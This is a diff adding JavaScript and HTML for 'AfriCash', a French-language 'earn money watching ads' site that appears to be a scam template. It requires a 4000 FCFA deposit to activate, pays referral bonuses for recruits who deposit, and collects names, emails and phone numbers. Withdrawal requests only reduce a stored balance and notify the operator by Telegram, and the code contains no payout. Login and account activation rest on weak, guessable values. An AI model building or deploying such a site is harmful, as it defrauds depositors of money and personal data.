+            <div class="adsense-zone" id="adSenseContainer">
+                <!-- COLLEZ VOTRE CODE ADSENSE ICI -->
+                <div style="color: #999; padding: 20px; text-align: center;">
+                    📺 Zone de publicité<br>
+                    <small>Code AdSense sera ajouté ici</small>
+                </div>
+            </div>
+        </div>
+
+        <div class="footer-note" style="margin-top: 20px;">
+            ⏱️ Regardez la publicité jusqu'à la fin pour recevoir votre récompense de <strong><span id="earningsDisplay">50</span> FCFA</strong>
+        </div>
+    </div>
+</div>
+
+<!-- ================================
+     JAVASCRIPT
+     ================================ -->
+<script>
+    // ============================================
+    // CONFIGURATION AUTOMATIQUE
+    // ============================================
+    const CONFIG = {
+        // Ces valeurs seront remplacées automatiquement
+        ADMIN_EMAIL: "votre-email@example.com",
+        ADMIN_PHONE: "+226 XX XX XX XX",
+        SHOP_LINK: "https://votre-boutique.com",
+        PLATFORM_NAME: "AfriCash",
+        PLATFORM_SLOGAN: "commencer à gagner de l'argent dès aujourd'hui",
+        
+        // Paramètres financiers
+        EARNINGS_PER_AD: 50,
+        AD_DURATION: 30,
+        DEPOSIT_REQUIRED: 4000,
+        MIN_WITHDRAWAL: 5000,
+        REFERRAL_BONUS: 2000,
+        
+        // Intégrations
+        GOOGLE_SCRIPT_URL: "",
+        TELEGRAM_BOT_TOKEN: "",
+        TELEGRAM_CHAT_ID: "",
+        ADSENSE_CODE: "",
+        
+        // Couleurs (optionnel)
+        PRIMARY_COLOR: "#667eea",
+        SECONDARY_COLOR: "#764ba2",
+        ACCENT_COLOR: "#FFE4B5"
+    };
+
+    // ============================================
+    // APPLICATION
+    // ============================================
+    let currentUser = null;
+    let adTimer = null;
+    let authMode = 'inscription';
+
+    // Initialisation
+    document.addEventListener('DOMContentLoaded', async () => {
+        await initApp();
+    });
+
+    async function initApp() {
+        try {
+            // Appliquer la configuration
+            applyConfiguration();
+            
+            // Vérifier code parrain
+            const urlParams = new URLSearchParams(window.location.search);
+            const referralCode = urlParams.get('invité') || urlParams.get('invite') || urlParams.get('ref');
+            
+            if (referralCode) {
+                document.getElementById('codeParrain').value = referralCode;
+            }
+
+            // Vérifier activation
+            await activateFromLink();
+
+            // Vérifier connexion
+            const userId = localStorage.getItem('africash_user_id');
+            
+            if (userId) {
+                const loaded = await loadUser(userId);
+                if (loaded) {
+                    showDashboard();
+                } else {
+                    showInscriptionFlux();
+                }
+            } else {
+                showInscriptionFlux();
+            }
+        } catch (error) {
+            console.error('Erreur:', error);
+            showInscriptionFlux();
+        } finally {
+            document.getElementById('loadingScreen').style.display = 'none';
+        }
+    }
+
+    function applyConfiguration() {
+        // Nom de la plateforme
+        document.getElementById('platformName').textContent = `Bienvenue sur ${CONFIG.PLATFORM_NAME}`;
+        document.getElementById('platformSlogan').textContent = CONFIG.PLATFORM_SLOGAN;
+        document.getElementById('platformNameFlux1').textContent = CONFIG.PLATFORM_NAME;
+        document.getElementById('platformSloganFlux1').textContent = CONFIG.PLATFORM_SLOGAN;
+        document.title = `${CONFIG.PLATFORM_NAME} - Gagnez de l'argent en ligne`;
+        
+        // Numéro admin
+        document.getElementById('adminPhoneNumber').textContent = CONFIG.ADMIN_PHONE;
+        
+        // Montants
+        document.getElementById('referralBonusDisplay').textContent = CONFIG.REFERRAL_BONUS;
+        document.getElementById('referralBonusDisplay2').textContent = CONFIG.REFERRAL_BONUS;
+        document.getElementById('minWithdrawalDisplay').textContent = CONFIG.MIN_WITHDRAWAL;
+        document.getElementById('depositAmountDisplay').textContent = CONFIG.DEPOSIT_REQUIRED;
+        document.getElementById('depositAmountDisplay2').textContent = CONFIG.DEPOSIT_REQUIRED;
+        document.getElementById('earningsDisplay').textContent = CONFIG.EARNINGS_PER_AD;
+        
+        // AdSense (si fourni)
+        if (CONFIG.ADSENSE_CODE) {
+            document.getElementById('adSenseContainer').innerHTML = CONFIG.ADSENSE_CODE;
+        }
+        
+        // Couleurs (si fournies)
+        if (CONFIG.PRIMARY_COLOR !== "#667eea") {
+            document.documentElement.style.setProperty('--primary-color', CONFIG.PRIMARY_COLOR);
+        }
+        if (CONFIG.SECONDARY_COLOR !== "#764ba2") {
+            document.documentElement.style.setProperty('--secondary-color', CONFIG.SECONDARY_COLOR);
+        }
+        if (CONFIG.ACCENT_COLOR !== "#FFE4B5") {
+            document.documentElement.style.setProperty('--accent-color', CONFIG.ACCENT_COLOR);
+        }
+    }
+
+    async function loadUser(userId) {
+        try {
+            const result = await window.storage.get(`user_${userId}`);
+            if (result && result.value) {
+                currentUser = JSON.parse(result.value);
+                updateUI();
+                return true;
+            }
+        } catch (error) {
+            console.error('Erreur:', error);
+        }
+        return false;
+    }
+
+    async function saveUser() {
+        if (!currentUser) return;
+        
+        try {
+            await window.storage.set(`user_${currentUser.id}`, JSON.stringify(currentUser));
+            localStorage.setItem('africash_user_id', currentUser.id);
+            updateUI();
+        } catch (error) {
+            console.error('Erreur:', error);
+        }
+    }
+
+    function updateUI() {
+        if (!currentUser) return;
+        
+        document.getElementById('userName').textContent = currentUser.nom;
+        document.getElementById('balanceAmount').textContent = currentUser.solde.toFixed(2);
+    }
+
+    function showDashboard() {
+        closeFlux('fluxInscription');
+        document.getElementById('header').style.display = 'flex';
+        document.getElementById('dashboard').style.display = 'block';
+    }
+
+    function showInscriptionFlux() {
+        document.getElementById('fluxInscription').classList.add('active');
+    }
+
+    function toggleAuthMode() {
+        const inscriptionForm = document.getElementById('inscriptionForm');
+        const connexionForm = document.getElementById('connexionForm');
+        const toggleText = document.getElementById('toggleText');
+        
+        if (authMode === 'inscription') {
+            authMode = 'connexion';
+            inscriptionForm.style.display = 'none';
+            connexionForm.style.display = 'block';
+            toggleText.textContent = 'Pas encore inscrit ? S\'inscrire';
+        } else {
+            authMode = 'inscription';
+            inscriptionForm.style.display = 'block';
+            connexionForm.style.display = 'none';
+            toggleText.textContent = 'Déjà inscrit ? Se connecter';
+        }
+    }
+
+    // Inscription
+    document.getElementById('inscriptionForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        
+        const nom = document.getElementById('nomInscrit').value.trim();
+        const email = document.getElementById('emailInscrit').value.trim();
+        const numero = document.getElementById('numeroInscrit').value.trim();
+        const codeParrain = document.getElementById('codeParrain').value.trim();
+
+        if (!nom || !email || !numero) {
+            alert('Veuillez remplir tous les champs obligatoires');
+            return;
+        }
+
+        if (!validateEmail(email)) {
+            showError('emailError');
+            return;
+        }
+
+        const existingUser = await findUserByEmail(email);
+        if (existingUser) {
+            alert('Cet email est déjà inscrit. Veuillez vous connecter.');
+            toggleAuthMode();
+            return;
+        }
+
+        const userId = generateUserId();
+        currentUser = {
+            id: userId,
+            nom: nom,
+            email: email,
+            numero: numero,
+            codeParrain: codeParrain,
+            solde: 0,
+            hasDeposited: false,
+            adsWatched: 0,
+            referralCode: generateReferralCode(),
+            referrals: [],
+            createdAt: new Date().toISOString()
+        };
+
+        await saveUser();
+
+        if (codeParrain) {
+            await registerReferral(codeParrain, currentUser.id);
+        }
+
+        await sendNotification('inscription', currentUser);
+
+        showDashboard();
+        showCelebration('🎉');
+        
+        setTimeout(() => {
+            alert('Bienvenue sur ' + CONFIG.PLATFORM_NAME + ' ! Pour commencer à gagner, activez votre compte avec un dépôt de ' + CONFIG.DEPOSIT_REQUIRED + ' FCFA.');
+        }, 1000);
+    });
+
+    // Connexion
+    document.getElementById('connexionForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        
+        const email = document.getElementById('emailConnexion').value.trim();
+        const numero = document.getElementById('numeroConnexion').value.trim();
+
+        if (!email || !numero) {
+            alert('Veuillez remplir tous les champs');
+            return;
+        }
+
+        const user = await findUserByCredentials(email, numero);
+        
+        if (user) {
+            currentUser = user;
+            localStorage.setItem('africash_user_id', user.id);
+            updateUI();
+            showDashboard();
+            showCelebration('👋');
+        } else {
+            alert('Email ou numéro incorrect. Veuillez réessayer ou vous inscrire.');
+        }
+    });
+
+    // Retrait
+    document.getElementById('retraitForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        
+        const email = document.getElementById('emailRetrait').value.trim();
+        const numero = document.getElementById('numeroRetrait').value.trim();
+        const montant = parseFloat(document.getElementById('montantRetrait').value);
+
+        if (!email || !numero || !montant) {
+            alert('Veuillez remplir tous les champs');
+            return;
+        }
+
+        if (!validateEmail(email)) {
+            showError('emailRetraitError');
+            return;
+        }
+
+        if (montant < CONFIG.MIN_WITHDRAWAL) {
+            showError('montantError');
+            alert(`Le montant minimum de retrait est de ${CONFIG.MIN_WITHDRAWAL} FCFA`);
+            return;
+        }
+
+        if (montant > currentUser.solde) {
+            showError('montantError');
+            alert('Solde insuffisant');
+            return;
+        }
+
+        currentUser.solde -= montant;
+        await saveUser();
+
+        await sendNotification('retrait', {
+            ...currentUser,
+            montantRetrait: montant,
+            numeroRetrait: numero,
+            emailRetrait: email
+        });
+
+        closeFlux('fluxRetrait');
+        
+        alert('✅ Demande de retrait envoyée avec succès!\n\nVous recevrez vos fonds dans les 24-48 heures.\nUn email de confirmation vous sera envoyé.');
+    });
+
+    function openShop() {
+        if (CONFIG.SHOP_LINK && CONFIG.SHOP_LINK !== "https://votre-boutique.com") {
+            window.open(CONFIG.SHOP_LINK, '_blank');
+        } else {
+            alert('Boutique disponible bientôt !');
+        }
+    }
+
+    function openInvite() {
+        const link = generateReferralLink();
+        document.getElementById('referralLink').textContent = link;
+        openFlux('fluxInvite');
+    }
+
+    function openWithdraw() {
+        document.getElementById('soldeDisponible').textContent = currentUser.solde.toFixed(2) + ' FCFA';
+        document.getElementById('emailRetrait').value = currentUser.email;
+        document.getElementById('numeroRetrait').value = currentUser.numero;
+        openFlux('fluxRetrait');
+    }
+
+    function confirmDepositSent() {
+        alert('⏳ Merci !\n\nDès réception de votre paiement, vous recevrez un SMS avec un lien d\'activation.\n\nCliquez sur ce lien pour activer immédiatement votre compte et commencer à gagner !');
+        closeFlux('fluxDepot');
+    }
+
+    function checkDepositAndStartEarning() {
+        if (!currentUser.hasDeposited) {
+            openFlux('fluxDepot');
+        } else {
+            startAdViewing();
+        }
+    }
+
+    async function startAdViewing() {
+        openFlux('fluxPub');
+        
+        let timeLeft = CONFIG.AD_DURATION;
+        document.getElementById('adTimer').textContent = timeLeft;
+        
+        adTimer = setInterval(() => {
+            timeLeft--;
+            document.getElementById('adTimer').textContent = timeLeft;
+            
+            if (timeLeft <= 0) {
+                clearInterval(adTimer);
+                completeAdViewing();
+            }
+        }, 1000);
+    }
+
+    async function completeAdViewing() {
+        currentUser.solde += CONFIG.EARNINGS_PER_AD;
+        currentUser.adsWatched++;
+        await saveUser();
+
+        closeFlux('fluxPub');
+        
+        showCelebration('💰');
+        playSound();
+        
+        setTimeout(() => {
+            alert(`🎉 Félicitations !\n\n+${CONFIG.EARNINGS_PER_AD} FCFA ajoutés à votre solde !\n\nNouveau solde : ${currentUser.solde.toFixed(2)} FCFA`);
+        }, 500);
+    }
+
+    function cancelAdViewing() {
+        if (confirm('Êtes-vous sûr de vouloir annuler ? Vous ne recevrez pas la récompense.')) {
+            if (adTimer) {
+                clearInterval(adTimer);
+                adTimer = null;
+            }
+            closeFlux('fluxPub');
+        }
+    }
+
+    function showCelebration(emoji) {
+        const celebration = document.createElement('div');
+        celebration.className = 'celebration';
+        celebration.textContent = emoji;
+        document.body.appendChild(celebration);
+        
+        setTimeout(() => celebration.remove(), 1000);
+    }
+
+    function playSound() {
+        try {
+            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+            const oscillator = audioContext.createOscillator();
+            const gainNode = audioContext.createGain();
+            
+            oscillator.connect(gainNode);
+            gainNode.connect(audioContext.destination);
+            
+            oscillator.frequency.value = 800;
+            oscillator.type = 'sine';
+            
+            gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
+            gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.5);
+            
+            oscillator.start(audioContext.currentTime);
+            oscillator.stop(audioContext.currentTime + 0.5);
+        } catch (error) {
+            console.log('Son non disponible');
+        }
+    }
+
+    function copyReferralLink() {
+        const link = generateReferralLink();
+        
+        navigator.clipboard.writeText(link).then(() => {
+            alert(`✅ Lien copié !\n\n${link}\n\nPartagez-le pour gagner ${CONFIG.REFERRAL_BONUS} FCFA par filleul qui active son compte !`);
+            closeFlux('fluxInvite');
+        }).catch(() => {
+            const textArea = document.createElement('textarea');
+            textArea.value = link;
+            document.body.appendChild(textArea);
+            textArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(textArea);
+            alert('✅ Lien copié !');
+            closeFlux('fluxInvite');
+        });
+    }
+
+    function generateReferralLink() {
+        const baseUrl = window.location.origin + window.location.pathname;
+        return `${baseUrl}?invité=${currentUser.referralCode}`;
+    }
+
+    function generateReferralCode() {
+        return Math.floor(10000 + Math.random() * 90000).toString();
+    }
+
+    function generateUserId() {
+        return 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+    }
+
+    async function registerReferral(referralCode, newUserId) {
+        try {
+            const keys = await window.storage.list('user_');
+            if (keys && keys.keys) {
+                for (const key of keys.keys) {
+                    const result = await window.storage.get(key);
+                    if (result && result.value) {
+                        const user = JSON.parse(result.value);
+                        if (user.referralCode === referralCode) {
+                            if (!user.referrals) user.referrals = [];
+                            user.referrals.push({
+                                userId: newUserId,
+                                date: new Date().toISOString(),
+                                activated: false,
+                                bonusPaid: false
+                            });
+                            await window.storage.set(key, JSON.stringify(user));
+                            break;
+                        }
+                    }
+                }
+            }
+        } catch (error) {
+            console.error('Erreur:', error);
+        }
+    }
+
+    async function activateUserAccount(userId) {
+        try {
+            const result = await window.storage.get(`user_${userId}`);
+            if (result && result.value) {
+                const user = JSON.parse(result.value);
+                user.hasDeposited = true;
+                await window.storage.set(`user_${userId}`, JSON.stringify(user));
+                
+                await giveReferralBonus(userId);
+                
+                return true;
+            }
+        } catch (error) {
+            console.error('Erreur:', error);
+        }
+        return false;
+    }
+
+    async function giveReferralBonus(activatedUserId) {
+        try {
+            const keys = await window.storage.list('user_');
+            if (keys && keys.keys) {
+                for (const key of keys.keys) {
+                    const result = await window.storage.get(key);
+                    if (result && result.value) {
+                        const user = JSON.parse(result.value);
+                        if (user.referrals && user.referrals.length > 0) {
+                            for (let i = 0; i < user.referrals.length; i++) {
+                                if (user.referrals[i].userId === activatedUserId && !user.referrals[i].bonusPaid) {
+                                    user.referrals[i].activated = true;
+                                    user.referrals[i].bonusPaid = true;
+                                    user.solde += CONFIG.REFERRAL_BONUS;
+                                    await window.storage.set(key, JSON.stringify(user));
+                                    
+                                    await sendNotification('referral_bonus', {
+                                        ...user,
+                                        bonus: CONFIG.REFERRAL_BONUS
+                                    });
+                                    
+                                    break;
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        } catch (error) {
+            console.error('Erreur:', error);
+        }
+    }
+
+    async function findUserByEmail(email) {
+        try {
+            const keys = await window.storage.list('user_');
+            if (keys && keys.keys) {
+                for (const key of keys.keys) {
+                    const result = await window.storage.get(key);
+                    if (result && result.value) {
+                        const user = JSON.parse(result.value);
+                        if (user.email === email) {
+                            return user;
+                        }
+                    }
+                }
+            }
+        } catch (error) {
+            console.error('Erreur:', error);
+        }
+        return null;
+    }
+
+    async function findUserByCredentials(email, numero) {
+        try {
+            const keys = await window.storage.list('user_');
+            if (keys && keys.keys) {
+                for (const key of keys.keys) {
+                    const result = await window.storage.get(key);
+                    if (result && result.value) {
+                        const user = JSON.parse(result.value);
+                        if (user.email === email && user.numero === numero) {
+                            return user;
+                        }
+                    }
+                }
+            }
+        } catch (error) {
+            console.error('Erreur:', error);
+        }
+        return null;
+    }
+
+    async function sendNotification(type, data) {
+        console.log(`📧 Notification ${type}:`, data);
+        
+        // Google Script
+        if (CONFIG.GOOGLE_SCRIPT_URL) {
+            try {
+                await fetch(CONFIG.GOOGLE_SCRIPT_URL, {
+                    method: 'POST',
+                    body: JSON.stringify({ type, ...data })
+                });
+            } catch (e) {
+                console.error('Erreur Google Script:', e);
+            }
+        }
+        
+        // Telegram
+        if (CONFIG.TELEGRAM_BOT_TOKEN && CONFIG.TELEGRAM_CHAT_ID) {
+            try {
+                let message = `🔔 *${CONFIG.PLATFORM_NAME} - ${type}*\n\n`;
+                message += `👤 ${data.nom}\n`;
+                message += `📧 ${data.email}\n`;
+                message += `📞 ${data.numero}\n`;
+                message += `💰 Solde: ${data.solde} FCFA\n`;
+                
+                if (type === 'retrait') {
+                    message += `\n💵 *RETRAIT*\n`;
+                    message += `Montant: ${data.montantRetrait} FCFA\n`;
+                    message += `Vers: ${data.numeroRetrait}\n`;
+                }
+                
+                await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CONFIG.TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (e) {
+                console.error('Erreur Telegram:', e);
+            }
+        }
+    }
+
+    function validateEmail(email) {
+        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+    }
+
+    function showError(elementId) {
+        const element = document.getElementById(elementId);
+        if (element) {
+            element.classList.add('show');
+            setTimeout(() => element.classList.remove('show'), 3000);
+        }
+    }
+
+    function openFlux(fluxId) {
+        document.getElementById(fluxId).classList.add('active');
+    }
+
+    function closeFlux(fluxId) {
+        document.getElementById(fluxId).classList.remove('active');
+        if (adTimer) {
+            clearInterval(adTimer);
+            adTimer = null;
+        }
+    }
+
+    function toggleMenu() {
+        document.getElementById('menuSidebar').classList.toggle('active');
+    }
+
+    function logout() {
+        if (confirm('Êtes-vous sûr de vouloir vous déconnecter ?')) {
+            localStorage.removeItem('africash_user_id');
+            currentUser = null;
+            document.getElementById('header').style.display = 'none';
+            document.getElementById('dashboard').style.display = 'none';
+            authMode = 'connexion';
+            toggleAuthMode();
+            showInscriptionFlux();
+        }
+    }
+
+    async function activateFromLink() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const activationCode = urlParams.get('activate');
+        
+        if (activationCode) {
+            const keys = await window.storage.list('user_');
+            if (keys && keys.keys) {
+                for (const key of keys.keys) {
+                    const result = await window.storage.get(key);
+                    if (result && result.value) {
+                        const user = JSON.parse(result.value);
+                        if (user.id === activationCode || user.referralCode === activationCode) {
+                            await activateUserAccount(user.id);
+                            alert('🎉 Votre compte a été activé avec succès !\n\nVous pouvez maintenant commencer à gagner de l\'argent !');
+                            
+                            currentUser = user;
+                            localStorage.setItem('africash_user_id', user.id);
+                            await loadUser(user.id);
+                            showDashboard();
+                            return;
+                        }
+                    }
+                }
+            }
+            alert('Code d\'activation invalide.');
+        }
+    }
+
+    // Fermer menu en cliquant dehors
+    document.addEventListener('click', (e) => {
+        const menu = document.getElementById('menuSidebar');
+        const menuIcon = document.querySelector('.menu-icon');
+        
+        if (menu.classList.contains('active') && 
+            !menu.contains(e.target) && 
+            !menuIcon.contains(e.target)) {
+            menu.classList.remove('active');
+        }
+    });
+
+    // Empêcher fermeture flux en cliquant contenu
+    document.querySelectorAll('.flux-content').forEach(content => {
+        content.addEventListener('click', (e) => {
+            e.stopPropagation();
+        });
+    });
+</script>
+```
+
+</body>
+</html>
